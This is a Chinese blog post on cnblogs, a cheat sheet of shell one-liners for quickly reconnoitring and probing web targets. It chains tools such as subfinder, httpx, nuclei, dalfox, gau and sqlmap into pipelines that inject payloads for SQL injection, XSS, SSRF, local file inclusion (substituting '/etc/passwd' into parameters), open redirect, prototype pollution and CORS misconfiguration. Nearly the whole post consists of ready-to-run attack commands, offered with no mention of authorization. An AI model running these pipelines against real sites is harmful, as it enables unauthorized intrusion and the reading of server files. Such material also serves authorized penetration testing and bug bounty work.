---
title: 〇 - 自动化工具迅速打点命令集合 - zha0gongz1
url: https://www.cnblogs.com/H4ck3R-XiX/p/17244222.html
source: 博客园 - zha0gongz1
date: 2023-03-23
fetch_date: 2025-10-04T10:20:28.184090
---

# 〇 - 自动化工具迅速打点命令集合 - zha0gongz1

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/zha0gongz1/)

# [zha0gongz1](https://www.cnblogs.com/zha0gongz1)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/zha0gongz1/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/zha0gongz1)
* 订阅
* [管理](https://i.cnblogs.com/)

# [〇 - 自动化工具迅速打点命令集合](https://www.cnblogs.com/zha0gongz1/p/17244222.html "发布于 2023-03-22 18:18")

总结梳理自动化弱点探测技巧

注意：本文不含工具安装教程，请自行安装并配置环境变量。以下命令仅适用于Linux|MacOS上运行

## 1.单工具使用

Automatic Scan - 使用 wappalyzer 技术检测目标应用的技术栈或组件进行自动 Web 扫描

```
nuclei -u https://example.com -as
```

只运行在最新nuclei-templates版本中添加的模板

```
nuclei -u https://example.com -nt
```

跳过需要身份验证的模板

```
nuclei -no-verify -t https://example.com -t /root/nuclei-templates/
```

全漏洞扫描，结果去重写入文件

```
nuclei -t /root/nuclei-templates/ -severity critical,high,medium -l list.txt -bs 20 -c 30 -rl 120 -nc -es info | anew -q all_nuclei_output.txt
```

sql注入扫描

```
echo "http://www.example.com" | httpx -path "/listproducts.php?cat=1’" -ms "Error: You have an error in your SQL syntax;"
```

## 2.组合工作流

进行子域枚举，检查HTTP服务，并将结果通过管道传输到 Nuclei 进行模板的漏洞扫描

```
subfinder -d targetdomain.com -silent | httpx | nuclei -t technologies/tech-detect.yaml
```

验证主机/域/资产存活状态

```
subfinder -d targetdomain.com -silent | httpx -silent -follow-redirects -mc 200 -timeout 10 | cut -d '/' -f3 | sort -u
amass enum -d targetdomain.com | httpx -silent -follow-redirects --fc 0,502,400,405,410,503,504 -timeout 10| cut -d '/' -f3 | sort -u
```

网站预览截图

```
assetfinder -subs-only http://target.com | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @'
```

扫描子域测试站点

```
subfinder -d domain -silent | dnsprobe -silent | cut -d ' ' -f1 | grep --color 'dmz\|api\|staging\|env\|v1\|stag\|prod\|dev\|stg\|test\|demo\|pre\|admin\|beta\|vpn\|cdn\|coll\|sandbox\|qa\|intra\|extra\|s3\|external\|back'
```

XSS

```
cat targets.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @
cat targets.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
```

SQL注入

```
httpx -l targets.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
```

SSRF

```
findomain -t http://target.com -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://www.example.com
```

LFI

```
gau http://vuln.target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

重定向

```
gau http://vuln.target.com | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

Prototype污染

```
subfinder -d http://target.com | httpx -silent | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam=="exploit"?"[VULN]":"[NOT]"' | sed "s/(//g"|sed"s/)//g" | sed "s/JS//g" | grep "VULN"
```

CORS

```
gau http://vuln.target.com | while read url;do target=$(curl -s -I -H "Origin: https://evvil.com" -X GET $url) | if grep 'https://evvil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```

提取js文件

```
echo http://target.com | haktrails subdomains | httpx -silent | getJS --complete | tojson | anew JS1
assetfinder http://vuln.target.com | waybackurls | grep -E "\.json(?:onp?)?$" | anew
```

从网页源码中提取注释中URL

```
cat targets.txt | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]*[-A-Za-z0-9+&@#/%=~_|]'
```

从hackerone上发现转储所属目标企业资产

```
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type]
```

**持续更新，欢迎补充** 😉

朋友可以背叛你，但技术和身材不会

posted @
2023-03-22 18:18
[zha0gongz1](https://www.cnblogs.com/zha0gongz1)
阅读(841)
评论(3)

收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202508/35695-20250830121216742-1062949948.jpg)](https://developer.huawei.com/consumer/cn/activity/digixActivity/digixcmsdetail/101750143863263087?ha_source=BKYQ3&ha_sourceId=89000408)

### 公告

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250923174722171-270282128.jpg)](https://qoder.com/)

[博客园](https://www.cnblogs.com/)
  ©  2004-2025

[![](//assets.cnblogs.com/images/ghs.png)浙公网安备 33010602011771号](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602011771)
[浙ICP备2021040463号-3](https://beian.miit.gov.cn)